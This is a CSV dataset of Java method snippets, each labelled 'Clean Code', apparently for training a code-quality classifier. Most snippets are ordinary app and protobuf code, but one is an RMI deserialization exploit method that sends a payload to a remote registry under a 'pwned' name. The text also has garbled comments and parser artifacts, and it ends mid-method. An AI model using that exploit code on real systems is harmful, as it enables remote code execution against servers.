"@Override public long getUpdateTime(){
  return this.mInfo.getUpdateTime();
}
",0,Clean Code
"/** 
 * <code>optional uint32 npc_id = 8;</code>
 * @return the npcId
 */
public int getNpcId(){
  return npcId;
}",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  super.onDraw(canvas);
  if (mIsToggled || (!mProperties.isToggle && isActivated()))   canvas.drawRoundRect(0,0,getWidth(),getHeight(),mComputedRadius,mComputedRadius,mRectPaint);
}",0,Clean Code
"@Override public MethodVisitor visitMethod(int access,String name,String desc,String signature,String[] exceptions){
  if (shouldKeepWholeClass == null) {
    shouldKeepWholeClass=context.shouldKeep(classInfo);
  }
  MethodVisitor mv=super.visitMethod(access,name,desc,signature,exceptions);
  if (!TypeUtil.isSynthetic(access) && !TypeUtil.isStatic(access) && !TypeUtil.isSynchronized(access)&& !shouldKeep(classInfo.getName(),name,desc)) {
    MethodInfo methodInfo=new MethodInfo(classInfo,access,name,desc);
    mv=new ExtractFieldInsnMethodVisitor(mv,context,methodInfo);
  }
  return mv;
}
",0,Clean Code
"@Override public boolean popBackStackImmediate(){
  checkStateLoss();
  return popBackStackImmediate(null,-1,0);
}
@Override public boolean popBackStackImmediate(@Nullable String name,int flags){
  checkStateLoss();
  return popBackStackImmediate(name,-1,flags);
}
@Override public boolean popBackStackImmediate(int id,int flags){
  checkStateLoss();
  execPendingActions();
  if (id < 0) {
    throw new IllegalArgumentException(""Bad id: "" + id);
  }
  return popBackStackImmediate(null,id,flags);
}
/** 
 * Used by all public popBackStackImmediate methods, this executes pending transactions and returns true if the pop action did anything, regardless of what other pending transactions did.
 * @return true if the pop operation did anything or false otherwise.
 */
private boolean popBackStackImmediate(String name,int id,int flags){
  execPendingActions();
  ensureExecReady(true);
  if (mPrimaryNav != null && id < 0 && name == null) {
    final FragmentManager childManager=mPrimaryNav.getChildFragmentManager();
    if (childManager.popBackStackImmediate()) {
      return true;
    }
  }
  boolean executePop=popBackStackState(mTmpRecords,mTmpIsPop,name,id,flags);
  if (executePop) {
    mExecutingActions=true;
    try {
      removeRedundantOperationsAndExecute(mTmpRecords,mTmpIsPop);
    }
  finally {
      cleanupExec();
    }
  }
  updateOnBackPressedCallbackEnabled();
  doPendingDeferredStart();
  burpActive();
  return executePop;
}",0,Clean Code
"public static Object getField(DynamicMessage dynamicMessage,Descriptors.FieldDescriptor fieldDescriptor,ProtoVisitor.FeatureContext ctx){
  if (ctx.isEnabled(ProtoVisitor.Feature.USE_DEFAULT_VALUE) || fieldDescriptor.isRepeated() || dynamicMessage.hasField(fieldDescriptor)) {
    return dynamicMessage.getField(fieldDescriptor);
  }
  return null;
}
",0,Clean Code
"public static void renderWithBlockEntity(BlockEntity blockEntity,float tickDelta,IVertexConsumerProvider vertexConsumerProvider){
  SimpleBlockRenderer.render(blockEntity.getPos(),blockEntity.getCachedState(),vertexConsumerProvider);
  vertexConsumerProvider.setOffset(blockEntity.getPos().getX(),blockEntity.getPos().getY(),blockEntity.getPos().getZ());
  BlockEntityRenderer<BlockEntity> renderer=mc.getBlockEntityRenderDispatcher().get(blockEntity);
  if (renderer != null && blockEntity.hasWorld() && blockEntity.getType().supports(blockEntity.getCachedState()))   renderer.render(blockEntity,tickDelta,MATRICES,vertexConsumerProvider,LightmapTextureManager.MAX_LIGHT_COORDINATE,OverlayTexture.DEFAULT_UV);
  vertexConsumerProvider.setOffset(0,0,0);
}",0,Clean Code
"public void updateSelectorBackground(boolean top,boolean bottom){
  if (this.top == top && this.bottom == bottom) {
    return;
  }
  this.top=top;
  this.bottom=bottom;
  updateBackground();
}
public void updateSelectorBackground(boolean top,boolean bottom,int selectorRad){
  if (this.top == top && this.bottom == bottom && this.selectorRad == selectorRad) {
    return;
  }
  this.top=top;
  this.bottom=bottom;
  this.selectorRad=selectorRad;
  updateBackground();
}
",0,Clean Code
"private void onTouchUp(boolean canceled){
  if (announcedDrag) {
    delegate.onEntityDragEnd(announcedTrash);
    announcedDrag=false;
  }
  announcedMultitouchDrag=false;
  if (!canceled && !recognizedLongPress && !hasPanned&& !hasTransformed&& !announcedSelection&& delegate != null) {
    delegate.onEntitySelected(this);
  }
  if (hasPanned && delegate != null) {
    delegate.onEntityDraggedTop(false);
    delegate.onEntityDraggedBottom(false);
  }
  AndroidUtilities.cancelRunOnUIThread(longPressRunnable);
  recognizedLongPress=false;
  hasPanned=false;
  hasTransformed=false;
  hasReleased=true;
  announcedSelection=false;
  stickyAngleRunnableValue=currentStickyAngle;
  if (setStickyAngleRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(setStickyAngleRunnable);
    setStickyAngleRunnable=null;
  }
  stickyXRunnableValue=stickyX;
  AndroidUtilities.cancelRunOnUIThread(setStickyXRunnable);
  stickyYRunnableValue=stickyY;
  AndroidUtilities.cancelRunOnUIThread(setStickyYRunnable);
  if (getParent() instanceof EntitiesContainerView) {
    ((EntitiesContainerView)getParent()).invalidate();
  }
}
",0,Clean Code
"/** 
 * <code>optional .DisplayRecordType display_record_type = 12;</code>
 * @param value the displayRecordType to set
 * @return this
 */
public PlayerSettingInfo setDisplayRecordType(final DisplayRecordTypeOuterClass.DisplayRecordType value){
  bitField0_|=0x00000001;
  displayRecordType=value.getNumber();
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint64 create_time_ms = 12;</code>
 * @return this
 */
public SceneSummonUnitInfo clearCreateTimeMs(){
  bitField0_&=~0x00000001;
  createTimeMs=0L;
  return this;
}",0,Clean Code
"public void setBinExportPath(final String path,final ESide side){
  if (side == ESide.PRIMARY) {
    primaryBinExport=path;
  }
 else {
    secondaryBinExport=path;
  }
}
",0,Clean Code
"@Override protected void doExpression(Expression expression,StringBuilder context){
  if (expression.type() == Filter.ExpressionType.NIN) {
    this.doNot(new Expression(Filter.ExpressionType.NOT,new Expression(Filter.ExpressionType.IN,expression.left(),expression.right())),context);
  }
 else {
    this.convertOperand(expression.left(),context);
    context.append(this.getOperationSymbol(expression));
    this.convertOperand(expression.right(),context);
  }
}
",0,Clean Code
"private void copyExtras(Intent intent){
  if (mExtras != null) {
    intent.replaceExtras(mExtras);
  }
}
",0,Clean Code
"/** 
 * Check the new properties and instance IP and port.
 * @param nodes nodes in properties
 * @return Whether it meets the conditions
 */
public static boolean check(String nodes){
  WebIpAndPortInfo webIpAndPort=WebIpAndPortHolder.getWebIpAndPort();
  if (StringUtil.isEmpty(nodes) || ALL.equals(nodes) || webIpAndPort == null) {
    return true;
  }
  String[] splitNodes=nodes.split(SEPARATOR);
  return Arrays.stream(splitNodes).distinct().map(WebIpAndPortInfo::build).filter(Objects::nonNull).anyMatch(each -> each.check(webIpAndPort.getIpSegment(),webIpAndPort.getPort()));
}
",0,Clean Code
"private static void addHasApkFilePath(HashSet<String> sets,File file,int level){
  if (level >= 3 || !file.isDirectory() || file.getName().startsWith(""."")) {
    return;
  }
  final File buildPath=new File(file,""build"" + File.separator + ""outputs""+ File.separator+ ""apk"");
  if (buildPath.exists()) {
    sets.add(buildPath.getAbsolutePath());
    return;
  }
  final File[] files=file.listFiles();
  for (  File f : files) {
    if (f.isDirectory()) {
      addHasApkFilePath(sets,f,level + 1);
    }
 else     if (f.getName().endsWith("".apk"")) {
      sets.add(f.getParent());
    }
  }
}",0,Clean Code
"/** 
 * <code>optional .RogueBuffSource source = 10;</code>
 * @param value the source to set
 * @return this
 */
public RogueActionResult setSource(final RogueBuffSourceOuterClass.RogueBuffSource value){
  bitField0_|=0x00000001;
  source=value.getNumber();
  return this;
}",0,Clean Code
"protected int findBlocksToPlace(HighwayBuilder b){
  int slot=findAndMoveToHotbar(b,itemStack -> itemStack.getItem() instanceof BlockItem && b.blocksToPlace.get().contains(blockItem.getBlock()),false);
  if (slot == -1) {
    if (!b.mineEnderChests.get() || !hasItem(b,Items.ENDER_CHEST) || countItem(b,stack -> stack.getItem().equals(Items.ENDER_CHEST)) <= b.saveEchests.get()) {
      b.error(""Out of blocks to place."");
    }
 else     b.setState(MineEnderChests);
    return -1;
  }
  return slot;
}",0,Clean Code
"@Override public VmClass getVmClass(){
  return BaseModule.getNumberClass();
}
",0,Clean Code
"@Override public EnterMapRotationRegionScRsp clone(){
  return new EnterMapRotationRegionScRsp().copyFrom(this);
}
",0,Clean Code
"/** 
 * <code>optional .BattleEndReason end_reason = 19;</code>
 * @param value the endReason to set
 * @return this
 */
public BattleStatistics setEndReason(final BattleEndReasonOuterClass.BattleEndReason value){
  bitField0_|=0x00000400;
  endReason=value.getNumber();
  return this;
}",0,Clean Code
"private void onAudioFocusChanged(int change){
  if (change == AudioManager.AUDIOFOCUS_LOSS || change == AudioManager.AUDIOFOCUS_LOSS_TRANSIENT || change == AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK) {
    pauseVideo();
  }
}
",0,Clean Code
"private String getText(String uri){
  var resource=new DefaultResourceLoader().getResource(uri);
  try {
    return resource.getContentAsString(StandardCharsets.UTF_8);
  }
 catch (  IOException e) {
    throw new RuntimeException(e);
  }
}",0,Clean Code
"public boolean processDeletedReactionTags(TLRPC.Message message){
  if (message == null || DialogObject.getPeerDialogId(message.peer_id) != getUserConfig().getClientUserId() || message.reactions == null || !message.reactions.reactions_as_tags || message.reactions.results == null) {
    return false;
  }
  long topic_id=MessageObject.getSavedDialogId(getUserConfig().getClientUserId(),message);
  boolean changed=false;
  for (int i=0; i < message.reactions.results.size(); ++i) {
    if (updateSavedReactionTags(topic_id,ReactionsLayoutInBubble.VisibleReaction.fromTLReaction(message.reactions.results.get(i).reaction),false,false)) {
      changed=true;
    }
  }
  return changed;
}",0,Clean Code
"public static int getLanguageOnSpacebarFormatType(@NonNull final RichInputMethodSubtype subtype){
  if (subtype.isNoLanguage()) {
    return FORMAT_TYPE_FULL_LOCALE;
  }
  if (sEnabledSubtypes.size() < 2 && sIsSystemLanguageSameAsInputLanguage && Settings.getInstance().getCurrent().mSecondaryLocales.isEmpty()) {
    return FORMAT_TYPE_NONE;
  }
  final Locale locale=subtype.getLocale();
  if (locale == null) {
    return FORMAT_TYPE_NONE;
  }
  final String keyboardLanguage=locale.getLanguage();
  final String keyboardLayout=subtype.getKeyboardLayoutSetName();
  int sameLanguageAndLayoutCount=0;
  for (  final InputMethodSubtype ims : sEnabledSubtypes) {
    final String language=SubtypeUtilsKt.locale(ims).getLanguage();
    if (keyboardLanguage.equals(language) && keyboardLayout.equals(SubtypeLocaleUtils.getKeyboardLayoutSetName(ims))) {
      sameLanguageAndLayoutCount++;
    }
  }
  return sameLanguageAndLayoutCount > 1 ? FORMAT_TYPE_FULL_LOCALE : FORMAT_TYPE_LANGUAGE_ONLY;
}",0,Clean Code
"@Override public int hashCode(){
  int result=Objects.hash(bq);
  result=31 * result + Arrays.deepHashCode(compressedVectors);
  return result;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(rogueVersionId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(nousValue);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(rogueAvatarInfo);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(storyInfo);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(pendingAction);
  }
  if ((bitField0_ & 0x00000020) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(buffInfo);
  }
  if ((bitField0_ & 0x00000040) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(miracleInfo);
  }
  if ((bitField0_ & 0x00000080) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(diceInfo);
  }
  if ((bitField0_ & 0x00000100) != 0) {
    size+=(1 * virtualItemInfo.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(virtualItemInfo);
  }
  return size;
}",0,Clean Code
"@Override public Ride findRides(String origin,String destination,int seats,RideManager rideManager,String vehicle){
  Map<UUID,Ride> activeRides=rideManager.getActiveRides();
  Ride potentialRide=null;
  for (  Ride r : activeRides.values()) {
    if (r.getDestination().equals(destination) && r.getOrigin().equals(origin) && r.getAvailableSeats() >= seats) {
      if (r.getVehicleModel().equals(vehicle)) {
        potentialRide=r;
      }
    }
  }
  if (potentialRide == null)   throw new NoRideFound();
  return potentialRide;
}
",0,Clean Code
"public static int getModeFromOpEntriesOrDefault(int op,@Nullable List<OpEntry> opEntries){
  if (op <= OP_NONE || op >= _NUM_OP || opEntries == null) {
    return AppOpsManager.MODE_IGNORED;
  }
  for (  OpEntry opEntry : opEntries) {
    if (opEntry.getOp() == op) {
      return opEntry.getMode();
    }
  }
  return opToDefaultMode(op);
}
",0,Clean Code
"public void setEventQueueLongPollTimeout(Duration eventQueueLongPollTimeout){
  this.eventQueueLongPollTimeout=eventQueueLongPollTimeout;
}
",0,Clean Code
"private void drawBackground(Canvas canvas,RectF rectF,float r,float alpha,View view){
  if (keyboardT > 0 && blurPaint != null && blurBitmapShader != null && blurBitmap != null && !blurBitmap.isRecycled()) {
    blurBitmapMatrix.reset();
    blurBitmapMatrix.postScale((float)rootView.getWidth() / blurBitmap.getWidth(),(float)rootView.getHeight() / blurBitmap.getHeight());
    float x=0, y=0;
    for (int i=0; i < 8 && view != null; ++i) {
      x+=view.getX();
      y+=view.getY();
      ViewParent parent=view.getParent();
      view=parent instanceof View ? (View)parent : null;
    }
    blurBitmapMatrix.postTranslate(-x,-y);
    blurBitmapShader.setLocalMatrix(blurBitmapMatrix);
    blurPaint.setAlpha((int)(0xFF * keyboardT * alpha));
    canvas.drawRoundRect(rectF,r,r,blurPaint);
  }
  backgroundPaint.setAlpha((int)(blurPaint == null ? 0x80 : lerp(0x80,0x99,keyboardT) * alpha));
  canvas.drawRoundRect(rectF,r,r,backgroundPaint);
}",0,Clean Code
"public CompatibleSerializer(Fury fury,Class<T> cls){
  super(fury,cls);
  this.refResolver=fury.getRefResolver();
  this.classResolver=fury.getClassResolver();
  classResolver.setSerializerIfAbsent(cls,this);
  fieldResolver=classResolver.getFieldResolver(cls);
  isRecord=RecordUtils.isRecord(type);
  if (isRecord) {
    constructor=RecordUtils.getRecordConstructor(type).f1;
    List<String> fieldNames=fieldResolver.getAllFieldsList().stream().map(FieldResolver.FieldInfo::getName).collect(Collectors.toList());
    recordInfo=new RecordInfo(cls,fieldNames);
  }
 else {
    this.constructor=ReflectionUtils.getCtrHandle(type,false);
    recordInfo=null;
  }
}
public CompatibleSerializer(Fury fury,Class<T> cls,FieldResolver fieldResolver){
  super(fury,cls);
  this.refResolver=fury.getRefResolver();
  this.classResolver=fury.getClassResolver();
  isRecord=RecordUtils.isRecord(type);
  Preconditions.checkArgument(!isRecord,cls);
  recordInfo=null;
  this.constructor=null;
  this.fieldResolver=fieldResolver;
}",0,Clean Code
"@Override public void insertString(final DocumentFilter.FilterBypass fb,final int offset,final String string,final AttributeSet attr) throws BadLocationException {
  if (isValid(string,0)) {
    super.insertString(fb,offset,string,attr);
  }
}",0,Clean Code
"@Override public MouseWheelAction getMouseWheelAction(){
  return mouseWheelAction == EMouseAction.ZOOM ? MouseWheelAction.ZOOM : MouseWheelAction.SCROLL;
}
",0,Clean Code
"public static URL redirectClassLoaderGetResource(ClassLoader loader,String name) throws MalformedURLException {
  String mappedResource=findMappedResource(null,name);
  if (mappedResource == null) {
    if (name.startsWith(""java/"") || name.startsWith(""jdk/"") || name.startsWith(""javax/"")) {
      return ClassLoader.getPlatformClassLoader().getResource(name);
    }
    return loader.getResource(name);
  }
 else {
    URL resource=loader.getResource(mappedResource);
    return resource == null ? null : new URL(""remap:"" + resource);
  }
}
",0,Clean Code
"@Override public void onPacketSend(PacketEvent.Send event){
  if (event.packet instanceof ClientCommandC2SPacket && ((ClientCommandC2SPacket)event.packet).getMode().equals(ClientCommandC2SPacket.Mode.START_FALL_FLYING) && !elytraFly.sprint.get()) {
    mc.player.setSprinting(true);
  }
}",0,Clean Code
"/** 
 * Whether suppress class registration warnings. The warnings can be used for security audit, but may be annoying.
 */
public boolean suppressClassRegistrationWarnings(){
  return suppressClassRegistrationWarnings;
}
",0,Clean Code
"private static long parseBase60(String value,boolean isNegative,int offset){
  var result=0L;
  var segments=value.substring(offset).split("":"");
  for (  var segment : segments) {
    var segmentNum=Long.parseLong(segment);
    result=VmSafeMath.add(VmSafeMath.multiply(result,60),segmentNum);
  }
  if (isNegative)   result=-result;
  return result;
}",0,Clean Code
"@Override public void work(){
  try {
    String[] detail=target.split("":"");
    if (detail.length == 2) {
      Registry registry=LocateRegistry.getRegistry(detail[0],Integer.parseInt(detail[1]));
      try {
        registry.list();
      }
 catch (      ConnectIOException ex) {
        registry=LocateRegistry.getRegistry(detail[0],Integer.parseInt(detail[1]),new RMISSLClientSocketFactory());
      }
      String name=""pwned"" + System.nanoTime();
      Remote remote=null;
      Object obj=payload.getObject();
      if (obj instanceof Remote) {
        remote=(Remote)obj;
      }
 else {
        remote=PayloadHelper.createMemoitizedProxy(PayloadHelper.createMap(name,obj),Remote.class);
      }
      try {
        Naming.lookup(registry,remote);
      }
 catch (      Throwable e) {
        Logger.error(e.toString());
      }
    }
  }
 catch (  Exception e) {
    if (e instanceof UnsupportedOperationException || e instanceof PermissionDenyException || e instanceof UnmarshalException) {
      Logger.error(""Surprise! You maybe met a rmi honeypot!"");
    }
    Logger.error(""Exception: "" + e.getClass().getName());
    Logger.error(e.getMessage());
  }
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(rollBuff);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(bonusSelectResult);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(miracleSelectResult);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(buffSelectResult);
  }
  return size;
}",0,Clean Code
"@Override public void onGalleryClick(){
  if (currentPage == PAGE_CAMERA && !takingPhoto && !takingVideo && requestGalleryPermission()) {
    animateGalleryListView(true);
  }
}
@Override protected void onGalleryClick(){
  captionEdit.keyboardNotifier.ignore(true);
  destroyGalleryListView();
  createGalleryListView(true);
  animateGalleryListView(true);
}
",0,Clean Code
"public BaseField(String name,Integer type){
  this.name=name;
  this.type=type;
}
",0,Clean Code
"/** 
 * Determines if the file can be analyzed by the analyzer. If the npm analyzer are enabled the archive analyzer will skip the node_modules and bower_modules directories.
 * @param pathname the path to the file
 * @return true if the file can be analyzed by the given analyzer; otherwisefalse
 */
@Override public boolean accept(File pathname){
  boolean accept=super.accept(pathname);
  final boolean npmEnabled=getSettings().getBoolean(Settings.KEYS.ANALYZER_NODE_AUDIT_ENABLED,false);
  final boolean yarnEnabled=getSettings().getBoolean(Settings.KEYS.ANALYZER_YARN_AUDIT_ENABLED,false);
  final boolean pnpmEnabled=getSettings().getBoolean(Settings.KEYS.ANALYZER_PNPM_AUDIT_ENABLED,false);
  if (accept && (npmEnabled || yarnEnabled || pnpmEnabled)) {
    try {
      accept=shouldProcess(pathname);
    }
 catch (    AnalysisException ex) {
      throw new UnexpectedAnalysisException(ex.getMessage(),ex.getCause());
    }
  }
  return accept;
}
",0,Clean Code
"/** 
 * 鍒犻櫎瑙掕壊
 */
@PreAuthorize(""@ss.hasPermi('system:role:remove')"") @DeleteMapping(""/{roleIds}"") public R remove(@PathVariable Long[] roleIds){
  roleService.deleteRoleByIds(roleIds);
  Arrays.stream(roleIds).forEach(id -> permissionService.resetLoginUserRoleCache(id));
  return R.ok();
}
",0,Clean Code
"@Override public boolean isSwipeBackEnabled(MotionEvent event){
  if (viewPagerFixed != null && (viewPagerFixed.currentPosition != 0 || viewPagerFixed.currentProgress != 1f)) {
    return false;
  }
  return super.isSwipeBackEnabled(event);
}",0,Clean Code
"public EMatchStateFilter getMatchStateFilter(){
  if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED)) {
    return EMatchStateFilter.MATCHED;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_UNMATCHED)) {
    return EMatchStateFilter.UNMATCHED;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED_IDENTICAL)) {
    return EMatchStateFilter.MATCHED_IDENTICAL;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED_INSTRUCTION_ONLY_CHANGES)) {
    return EMatchStateFilter.MATCHED_INSTRUCTION_CHANGES;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED_INSTRUCTION_CHANGES)) {
    return EMatchStateFilter.MATCHED_INSTRUCTION_CHANGES;
  }
 else   if (matchStateCombo.getValue().equals(FILTER_ITEM_MATCHED_STRUCTURAL_CHANGES)) {
    return EMatchStateFilter.MATCHED_STRUTURAL_CHANGES;
  }
  return EMatchStateFilter.NONE;
}
",0,Clean Code
"public ListNode rotateRight(ListNode head,int k){
  if (k <= 0 || head == null || head.next == null) {
    return head;
  }
  ListNode last=head;
  int length=1;
  while (last.next != null) {
    last=last.next;
    length++;
  }
  last.next=head;
  int rotations=k % length;
  int skip=length - rotations;
  ListNode newLast=head;
  for (int i=0; i < skip - 1; i++) {
    newLast=newLast.next;
  }
  head=newLast.next;
  newLast.next=null;
  return head;
}",0,Clean Code
"public static String replaceDateExpression1(Calendar dateTime,String logFileName){
  if (dateTime == null || logFileName == null) {
    return null;
  }
  String year=String.valueOf(dateTime.get(Calendar.YEAR));
  String month=String.valueOf(dateTime.get(Calendar.MONTH) + 1);
  String day=String.valueOf(dateTime.get(Calendar.DAY_OF_MONTH));
  String hour=String.valueOf(dateTime.get(Calendar.HOUR_OF_DAY));
  String minute=String.valueOf(dateTime.get(Calendar.MINUTE));
  int hhIndex=logFileName.indexOf(""hh"");
  int mmIndex=logFileName.indexOf(""mm"");
  logFileName=logFileName.replaceAll(""YYYY"",year);
  logFileName=logFileName.replaceAll(""MM"",externDate(month));
  logFileName=logFileName.replaceAll(""DD"",externDate(day));
  logFileName=logFileName.replaceAll(""hh"",externDate(hour));
  if (hhIndex != -1 && mmIndex != -1 && mmIndex >= hhIndex + 2 && mmIndex < hhIndex + 4) {
    logFileName=logFileName.replaceAll(""mm"",externDate(minute));
  }
  return logFileName;
}",0,Clean Code
"private void hideActionFab(){
  if (null != mFabLayout && STATE_NORMAL == mState && mShowActionFab) {
    mShowActionFab=false;
    View fab=mFabLayout.getPrimaryFab();
    fab.animate().scaleX(0.0f).scaleY(0.0f).setListener(mActionFabAnimatorListener).setDuration(ANIMATE_TIME).setStartDelay(0L).setInterpolator(AnimationUtils.SLOW_FAST_INTERPOLATOR).start();
  }
}",0,Clean Code
"@Override protected void before(final MethodHookParam param) throws Throwable {
  param.setResult(false);
}
",0,Clean Code
"/** 
 * <code>repeated uint32 entry_id_list = 1;</code>
 * @return this
 */
public GetSceneMapInfoCsReq clearEntryIdList(){
  bitField0_&=~0x00000002;
  entryIdList.clear();
  return this;
}",0,Clean Code
"/** 
 * 鑾峰彇group鍘嗗彶娑堣垂鎸囨爣
 */
@PostMapping(""/topic/consumer_offsets/chart"") public RestResponse getOffsetStats(@RequestBody Map<String,String> queryMap){
  String clusterID=queryMap.get(Constants.KeyStr.CLUSTERID);
  String topic=queryMap.get(BrokerConfig.TOPIC);
  String group=queryMap.get(BrokerConfig.GROUP);
  String type=queryMap.get(Constants.JsonObject.TYPE);
  if (StringUtils.isBlank(clusterID) || StringUtils.isBlank(topic) || StringUtils.isBlank(group)|| StringUtils.isBlank(type)) {
    return ERROR(""clusterID topic group and type must not blank."");
  }
  String start=queryMap.get(""start"");
  String end=queryMap.get(""end"");
  return SUCCESS_DATA(elasticsearchService.queryOffset(clusterID,topic,group,type,start,end));
}
",0,Clean Code
"@Override public void invalidate(){
  ChatMessageCell.this.invalidate();
}
@Override public void invalidate(){
  if (currentMessageObject == null) {
    return;
  }
  super.invalidate();
  if ((invalidatesParent || currentMessagesGroup != null && invalidateParentForce()) && getParent() != null) {
    View parent=(View)getParent();
    if (parent.getParent() != null) {
      parent.invalidate();
      parent=(View)parent.getParent();
      parent.invalidate();
    }
  }
  if (isBlurred && delegate != null) {
    delegate.invalidateBlur();
  }
}
@Override public void invalidate(int l,int t,int r,int b){
  if (currentMessageObject == null) {
    return;
  }
  super.invalidate(l,t,r,b);
  if (invalidatesParent) {
    if (getParent() != null) {
      View parent=(View)getParent();
      parent.invalidate((int)getX() + l,(int)getY() + t,(int)getX() + r,(int)getY() + b);
    }
  }
  if (isBlurred && delegate != null) {
    delegate.invalidateBlur();
  }
}
",0,Clean Code
"@Override public Relic mergeFrom(final Relic other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasUniqueId()) {
    setUniqueId(other.uniqueId);
  }
  if (other.hasLevel()) {
    setLevel(other.level);
  }
  if (other.hasExp()) {
    setExp(other.exp);
  }
  if (other.hasBaseAvatarId()) {
    setBaseAvatarId(other.baseAvatarId);
  }
  if (other.hasTid()) {
    setTid(other.tid);
  }
  if (other.hasEquipAvatarId()) {
    setEquipAvatarId(other.equipAvatarId);
  }
  if (other.hasMainAffixId()) {
    setMainAffixId(other.mainAffixId);
  }
  if (other.hasIsDiscarded()) {
    setIsDiscarded(other.isDiscarded);
  }
  if (other.hasIsProtected()) {
    setIsProtected(other.isProtected);
  }
  if (other.hasSubAffixList()) {
    getMutableSubAffixList().addAll(other.subAffixList);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@17f18dc6!org.eclipse.jdt.core.dom.MethodDeclaration@3e09a712",0,Clean Code
"private UpdateEnergyScNotify(){
}
",0,Clean Code
"public String getStack(){
  return stack;
}
",0,Clean Code
"@Override public void getTaskLogs(TaskServicePb.GetTaskLogsRequest req,StreamObserver<TaskServicePb.GetTaskLogsResponse> response){
  List<TaskExecLog> logs=taskService.getTaskLogs(req.getTaskId());
  response.onNext(TaskServicePb.GetTaskLogsResponse.newBuilder().addAllLogs(logs.stream().map(PROTO_MAPPER::toProto)::iterator).build());
  response.onCompleted();
}
",0,Clean Code
"public int getScrollForPage(int index){
  if (!isPageScrollsInitialized() || index >= mPageScrolls.length || index < 0) {
    return 0;
  }
 else {
    return mPageScrolls[index];
  }
}",0,Clean Code
"@Subscribe public void bwtSyncStatus(BwtSyncStatusEvent event){
  if (connectionService != null && connectionService.isRunning() && event.getProgress() < 100) {
    DateFormat dateFormat=new SimpleDateFormat(""yyyy/MM/dd HH:mm"");
    appendText(""\nThe connection to the Bitcoin Core node was successful, but it is still syncing and cannot be used yet."");
    appendText(""\nCurrently "" + event.getProgress() + ""% completed to date ""+ dateFormat.format(event.getTip()));
    connectionService.cancel();
  }
}",0,Clean Code
"public void checkDialogMessages(long dialogId){
  if (!isFeatureAvailable()) {
    return;
  }
  getMessagesStorage().getStorageQueue().postRunnable(() -> {
    final ArrayList<MessageObject> dialogMessages=messagesController.dialogMessage.get(dialogId);
    if (dialogMessages == null) {
      return;
    }
    ArrayList<TLRPC.Message> customProps=new ArrayList<>();
    for (int i=0; i < dialogMessages.size(); ++i) {
      MessageObject dialogMessage=dialogMessages.get(i);
      if (dialogMessage == null || dialogMessage.messageOwner == null) {
        customProps.add(null);
        continue;
      }
      customProps.add(getMessagesStorage().getMessageWithCustomParamsOnlyInternal(dialogMessage.getId(),dialogMessage.getDialogId()));
    }
    AndroidUtilities.runOnUIThread(() -> {
      boolean updated=false;
      for (int i=0; i < Math.min(customProps.size(),dialogMessages.size()); ++i) {
        MessageObject dialogMessage=dialogMessages.get(i);
        TLRPC.Message props=customProps.get(i);
        if (dialogMessage == null || dialogMessage.messageOwner == null || props == null) {
          continue;
        }
        dialogMessage.messageOwner.translatedText=props.translatedText;
        dialogMessage.messageOwner.translatedToLanguage=props.translatedToLanguage;
        if (dialogMessage.updateTranslation(false)) {
          updated=true;
        }
      }
      if (updated) {
        NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.updateInterfaces,0);
      }
    }
);
  }
);
}",0,Clean Code
"@Override public void setScaleType(ScaleType scaleType){
  if (scaleType != SCALE_TYPE) {
    throw new IllegalArgumentException(String.format(""ScaleType %s not supported."",scaleType));
  }
}
",0,Clean Code
"@Override public Set<String> zrange(String key,long start,long end){
  return jedisCluster.zrange(key,start,end);
}
",0,Clean Code
"public static int c2(int n){
  if (n < 1) {
    return 0;
  }
  if (n == 1 || n == 2 || n == 3) {
    return n;
  }
  int res=3;
  int pre=2;
  int prepre=1;
  int tmp1=0;
  int tmp2=0;
  for (int i=4; i <= n; i++) {
    tmp1=res;
    tmp2=pre;
    res=res + prepre;
    pre=tmp1;
    prepre=tmp2;
  }
  return res;
}",0,Clean Code
"/** 
 * 鏍规嵁ids鏌ヨ鐢ㄦ埛淇℃伅
 * @param userId id
 * @return data
 */
@PostMapping(value=""/adminUser/queryUserById"") Result<SimpleUser> queryUserById(@RequestParam(""userId"") Long userId);
",0,Clean Code
"private void sanitizeFonts(PDDocument document){
  for (  PDPage page : document.getPages()) {
    if (page != null && page.getResources() != null && page.getResources().getCOSObject() != null) {
      page.getResources().getCOSObject().removeItem(COSName.getPDFName(""Font""));
    }
  }
}
",0,Clean Code
"protected void addAvailableCharsetNamesIfNeed(org.springframework.ui.Model model,DataSetEntity entity){
  String type=entity.getDataSetType();
  if (DataSetEntity.DATA_SET_TYPE_JsonFile.equals(type) || DataSetEntity.DATA_SET_TYPE_CsvFile.equals(type) || DataSetEntity.DATA_SET_TYPE_Http.equals(type)) {
